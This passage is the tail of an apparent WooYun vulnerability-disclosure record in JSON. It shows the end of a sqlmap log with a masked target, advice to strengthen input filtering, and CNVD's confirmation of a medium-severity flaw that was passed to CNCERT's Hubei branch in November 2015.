'C:\\DOCUME~1\\ADMINI~1\\??\\salmap\\Bin\\output\\**.**.**.**'[*] shutting down at 12:11:45   修复方案：  加强字符 过滤   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2015-11-24 09:34 厂商回复： CNVD确认并复现所述漏洞情况，已经转由CNCERT下发给湖北分中心，由湖北分中心后续协调网站管理单位处置。  最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}